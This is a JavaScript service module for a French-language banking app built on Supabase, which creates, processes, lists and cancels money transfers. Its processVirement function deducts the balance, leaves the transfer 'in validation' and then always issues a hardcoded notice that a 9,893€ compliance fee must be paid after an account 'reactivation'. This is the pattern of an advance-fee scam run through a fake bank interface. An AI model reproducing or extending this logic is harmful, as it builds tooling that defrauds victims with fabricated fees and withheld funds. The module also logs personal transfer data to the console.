import { supabase } from '../config/supabase';
import { comptesService } from './comptesService';
import { transactionsService } from './transactionsService';
import { notificationsService } from './notificationsService';
import { emailService } from './emailService';

// Debug des imports
console.log('🔍 VIR DEBUG: transactionsService importé:', transactionsService);
console.log('🔍 VIR DEBUG: transactionsService.createTransaction:', transactionsService?.createTransaction);

export const virementsService = {
  // Créer un nouveau virement
  async createVirement(virementData) {
    try {
      console.log('🔍 VIR DEBUG: Création du virement:', virementData);
      
      const { data, error } = await supabase
        .from('virements')
        .insert([{
          montant: virementData.montant,
          beneficiaire_id: virementData.beneficiaire_id,
          iban_destinataire: virementData.iban,
          motif: virementData.motif,
          compte_source_id: virementData.compte_source_id,
          user_id: virementData.user_id,
          statut: 'en_validation',
          reference: this.generateReference(),
          date_virement: new Date().toISOString()
        }])
        .select()
        .single();

      if (error) {
        console.error('❌ VIR DEBUG: Erreur création virement:', error);
        throw error;
      }

      console.log('✅ VIR DEBUG: Virement créé:', data);
      return data;
    } catch (error) {
      console.error('❌ VIR DEBUG: Erreur lors de la création du virement:', error);
      throw error;
    }
  },

  // Traiter un virement (déduire le solde et créer la transaction)
  async processVirement(virementId) {
    let virement = null;
    
    try {
      console.log('🔍 VIR DEBUG: Traitement du virement:', virementId);
      
      // Récupérer le virement
      const { data: virementData, error: virementError } = await supabase
        .from('virements')
        .select('*')
        .eq('id', virementId)
        .single();

      if (virementError) {
        console.error('❌ VIR DEBUG: Erreur récupération virement:', virementError);
        throw virementError;
      }

      virement = virementData;
      console.log('🔍 VIR DEBUG: Virement récupéré:', virement);

      // Récupérer le compte source
      const compteSource = await comptesService.getCompteById(virement.compte_source_id);
      console.log('🔍 VIR DEBUG: Compte source:', compteSource);

      // Vérifier le solde
      if (parseFloat(compteSource.solde) < parseFloat(virement.montant)) {
        throw new Error('Solde insuffisant');
      }

      // Déduire le montant du compte
      const nouveauSolde = parseFloat(compteSource.solde) - parseFloat(virement.montant);
      await comptesService.updateSolde(virement.compte_source_id, nouveauSolde);
      console.log('✅ VIR DEBUG: Solde mis à jour:', nouveauSolde);

      // RÉCUPÉRER L'EMAIL DU BÉNÉFICIAIRE
      let beneficiaireEmail = null;
      try {
        const { data: beneficiaire, error: beneficiaireError } = await supabase
          .from('beneficiaires')
          .select('email, nom, prenom')
          .eq('id', virement.beneficiaire_id)
          .single();

        if (!beneficiaireError && beneficiaire) {
          beneficiaireEmail = beneficiaire.email;
          console.log('📧 VIR DEBUG: Email du bénéficiaire récupéré:', beneficiaireEmail);
        } else {
          console.warn('⚠️ VIR DEBUG: Aucun email trouvé pour le bénéficiaire');
        }
      } catch (error) {
        console.error('❌ VIR DEBUG: Erreur récupération email bénéficiaire:', error);
      }

      // ENVOYER L'EMAIL DE NOTIFICATION AU MOMENT DE LA DÉDUCTION
      try {
        console.log('📧 VIR DEBUG: Envoi email de notification de virement');
        const virementDataWithEmail = {
          ...virement,
          beneficiaire_email: beneficiaireEmail
        };
        await emailService.sendVirementNotification(virement.user_id, virementDataWithEmail);
        console.log('✅ VIR DEBUG: Email de notification envoyé avec succès');
      } catch (emailError) {
        console.error('❌ VIR DEBUG: Erreur lors de l\'envoi de l\'email:', emailError);
        // Ne pas faire échouer le virement si l'email échoue
        // L'email peut être renvoyé plus tard
      }

      // Créer la transaction avec statut "en_attente"
      const transactionData = {
        type: 'virement_sortant',
        montant: virement.montant,
        description: virement.motif || `Virement vers ${virement.iban_destinataire}`,
        compte_id: virement.compte_source_id,
        user_id: virement.user_id,
        statut: 'en_attente',
        reference: virement.reference,
        date_transaction: new Date().toISOString()
      };

      console.log('🔍 VIR DEBUG: Tentative de création de transaction avec:', transactionData);
      console.log('🔍 VIR DEBUG: transactionsService disponible:', !!transactionsService);
      console.log('🔍 VIR DEBUG: createTransaction disponible:', !!transactionsService?.createTransaction);

      let transaction;
      try {
        transaction = await transactionsService.createTransaction(transactionData);
        console.log('✅ VIR DEBUG: Transaction créée:', transaction);
      } catch (transactionError) {
        console.error('❌ VIR DEBUG: Erreur lors de la création de la transaction:', transactionError);
        throw new Error(`Erreur lors de la création de la transaction: ${transactionError.message}`);
      }

      // Créer la notification de frais de validation
      await notificationsService.createWarningNotification(
        virement.user_id,
        'Validation de virement requise',
        'Votre compte a été réactivé le 22/07/2025. Pour des raisons de conformité et de sécurité renforcée, tout virement initié dans les 15 jours suivant le déblocage nécessite un règlement de 9 893€. Merci de procéder au paiement pour poursuivre.'
      );

      console.log('✅ VIR DEBUG: Virement en validation avec notification de frais');
      return { success: true, virement, transaction, status: 'en_validation' };
    } catch (error) {
      console.error('❌ VIR DEBUG: Erreur lors du traitement du virement:', error);
      
      // Créer une notification d'erreur seulement si on a le virement
      if (virement) {
        try {
          await notificationsService.createWarningNotification(
            virement.user_id,
            'Erreur de virement',
            'Une erreur est survenue lors du traitement de votre virement. Veuillez contacter le support.'
          );
          
          // Envoyer un email d'erreur également
          try {
            await emailService.sendVirementErrorNotification(
              virement.user_id, 
              error.message || 'Erreur lors du traitement du virement'
            );
          } catch (emailError) {
            console.error('❌ VIR DEBUG: Erreur envoi email d\'erreur:', emailError);
          }
        } catch (notifError) {
          console.error('❌ VIR DEBUG: Erreur création notification:', notifError);
        }
      }
      
      throw error;
    }
  },

  // Récupérer les virements d'un utilisateur
  async getVirements(userId) {
    try {
      const { data, error } = await supabase
        .from('virements')
        .select(`
          *,
          beneficiaires (
            id,
            nom,
            prenom,
            iban
          )
        `)
        .eq('user_id', userId)
        .order('date_virement', { ascending: false });

      if (error) throw error;
      return data;
    } catch (error) {
      console.error('Erreur lors de la récupération des virements:', error);
      throw error;
    }
  },

  // Récupérer un virement par ID
  async getVirementById(virementId) {
    try {
      const { data, error } = await supabase
        .from('virements')
        .select(`
          *,
          beneficiaires (
            id,
            nom,
            prenom,
            iban
          )
        `)
        .eq('id', virementId)
        .single();

      if (error) throw error;
      return data;
    } catch (error) {
      console.error('Erreur lors de la récupération du virement:', error);
      throw error;
    }
  },

  // Annuler un virement
  async cancelVirement(virementId) {
    try {
      const { error } = await supabase
        .from('virements')
        .update({ 
          statut: 'annule',
          date_annulation: new Date().toISOString()
        })
        .eq('id', virementId);

      if (error) throw error;
      return { success: true };
    } catch (error) {
      console.error('Erreur lors de l\'annulation du virement:', error);
      throw error;
    }
  },

  // Vérifier les limites de virement
  async checkVirementLimit(userId, montant) {
    try {
      // Récupérer les virements du jour
      const today = new Date();
      today.setHours(0, 0, 0, 0);
      
      const { data, error } = await supabase
        .from('virements')
        .select('montant')
        .eq('user_id', userId)
        .gte('date_virement', today.toISOString())
        .eq('statut', 'traite');

      if (error) throw error;

      const totalJour = data.reduce((sum, virement) => sum + parseFloat(virement.montant), 0);
      const limiteJour = 100000; // 100.000€ par jour

      return {
        totalJour,
        limiteJour,
        reste: limiteJour - totalJour,
        autorise: (totalJour + parseFloat(montant)) <= limiteJour
      };
    } catch (error) {
      console.error('Erreur lors de la vérification des limites:', error);
      throw error;
    }
  },

  // Générer une référence unique
  generateReference() {
    const timestamp = Date.now().toString().slice(-8);
    const random = Math.random().toString(36).substring(2, 6).toUpperCase();
    return `VIR-${timestamp}-${random}`;
  },

  // Statistiques des virements
  async getVirementStats(userId) {
    try {
      const { data, error } = await supabase
        .from('virements')
        .select('montant, statut, date_virement')
        .eq('user_id', userId);

      if (error) throw error;

      const stats = {
        total: data.length,
        totalMontant: data.reduce((sum, v) => sum + parseFloat(v.montant), 0),
        enAttente: data.filter(v => v.statut === 'en_attente').length,
        enValidation: data.filter(v => v.statut === 'en_validation').length,
        traites: data.filter(v => v.statut === 'traite').length,
        annules: data.filter(v => v.statut === 'annule').length
      };

      return stats;
    } catch (error) {
      console.error('Erreur lors de la récupération des statistiques:', error);
      throw error;
    }
  }
}; 